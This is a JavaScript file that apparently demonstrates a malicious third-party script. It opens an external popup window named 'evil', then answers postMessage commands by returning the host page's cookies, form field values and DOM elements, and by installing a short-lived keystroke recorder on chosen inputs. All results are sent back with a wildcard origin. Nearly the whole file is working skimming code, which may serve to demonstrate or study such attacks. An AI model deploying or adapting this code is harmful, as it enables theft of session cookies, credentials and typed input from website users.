(function() {


var viewportwidth = document.documentElement.clientWidth;
let leakWin;

let regex = /[?&]([^=#]+)=([^&#]*)/g,
    url = window.location.href,
    urlQuery = {},
    match;
while(match = regex.exec(url)) {
    urlQuery[match[1]] = match[2];
}

window.addEventListener('keydown', function(evt) {
  if (evt.key === '-') {
    leakWin = window.open("https://instartlogic.github.io/demo/sagemart.html", "evil", "menubar=no,location=no,resizable=yes,scrollbars=yes,status=no,height=700,width=500,left=" + (viewportwidth - 500));
    //let leakWin = window.open("/js/third_party/leak.html", "evil", "menubar=no,location=no,resizable=yes,scrollbars=yes,status=no,height=700,width=500,left="+(viewportwidth-500));
  }
});


window.onbeforeunload = function () { leakWin.close() };

const attacks = {
  cookie: getCookie,
  input: getForms,
  list: getDom,
  keystroke: getForms
}

window.addEventListener('message', function (evt) {
  if (evt.data.attack) {
    debugger;
    let date = new Date();
    date = `${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}`;
    switch (evt.data.attack) {
      case "cookie":
        evt.source.postMessage({
          name: evt.data.arg,
          value: getCookie(evt.data.arg),
          date: date
        }, '*');
      break;

      case "input":
        evt.source.postMessage({
          name: evt.data.arg,
          value: getForm(evt.data.arg),
          date: date
        }, '*');
      break;

      case "list":
        evt.source.postMessage({
          name: evt.data.arg,
          value: getDom(evt.data.arg),
          date: date
        }, '*');
      break;
      case "keystroke":
        installKeyRecorder(evt, evt.data.arg);
      break;
      }
  }
});

function getCookie(name) {
  var value = "; " + document.cookie;
  var parts = value.split("; " + name + "=");
  if (parts.length == 2) return parts.pop().split(";").shift();
}

function getCookies(names) {
  let result = [];
  if (!names) {
    return;
  }
  for (let i=0; i < names.length; i++) {
    result.push(names[i], getCookie(names[i]));
  }
  return result;
}

function getForms(field, value) {
  if (!field && !value) {
    return
  }
  var el = document.querySelectorAll(`[${field}=${value}]`);
  if (el) {
    return Array.prototype.slice.call(el).map(x => x.value);
  }
  return "";
}

function getForm(field) {
  if (!field) {
    return
  }
  var el = document.querySelector(field);
  if (el) {
    return el.value
  }
  return "";
}

function getDom(field) {
  if (!field) {
    return
  }
  var els = document.querySelectorAll(field);
  let result = [];
  for (let el of els) {
    result.push(`<${el.tagName} ${el.id ? 'id=' + el.id : ''} ${el.classList ? 'id=' + el.classList : ''}></${el.tagName}>`);
  }
  return result;
}

function installKeyRecorder(evt, field) {
  if (!field) {
    return
  }
  var els = document.querySelectorAll(field);
  let result = [];
  for (let el of els) {
    function listener(event) {
      let date = new Date();
      date = `${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}`;
  
      evt.source.postMessage({
        name: field,
        value: event.key,
        date: date
      }, '*');
    }

    el.addEventListener('keydown', listener);

    setTimeout(function() {
      el.removeEventListener('keydown', listener);
    }, 10000);
  }
  return result;
}
})();


